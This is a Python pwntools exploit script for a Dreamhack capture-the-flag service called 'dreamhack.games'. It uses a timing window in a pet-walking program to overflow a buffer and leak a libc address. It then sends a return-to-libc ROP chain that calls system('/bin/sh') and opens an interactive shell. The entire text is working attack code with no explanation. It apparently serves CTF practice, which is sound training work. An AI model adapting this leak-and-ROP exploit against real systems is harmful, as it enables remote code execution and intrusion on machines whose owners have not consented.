from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17490
r = remote(HOST, PORT)

def walk():
    r.sendlineafter(b'> ', b'2')

def setup():
    r.sendline('1')
    r.sendlineafter(b': ', b'dog')
    r.sendlineafter(b': ', b'A'*0x10+p64(0x100))
    walk()
    start = time.monotonic()
    r.recvuntil(b'for a walk..')
    r.sendline(b'1')
    sleep((4.04 - (time.monotonic() - start)))
    print((time.monotonic() - start))
    r.sendlineafter(b': ', b'hamster')
    r.sendafter(b': ', b'B'*0xf)
    time.sleep(0.2)

setup()

r.sendline(b'3')
r.sendafter(b': ', b'A'*0x40)

walk()

r.recvuntil(b'A'*0x40)
libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x29d90
binsh = libc + 0x1d8698
system = libc + 0x50d70
ret = libc + 0x29139
pop_rdi = libc + 0x2a3e5

setup()

r.sendline(b'3')
payload = flat([
    b'A'*0x40,
    ret,
    pop_rdi,binsh,
    system
])
r.sendafter(b': ',payload)

time.sleep(1)
r.sendline(b'4')

r.interactive()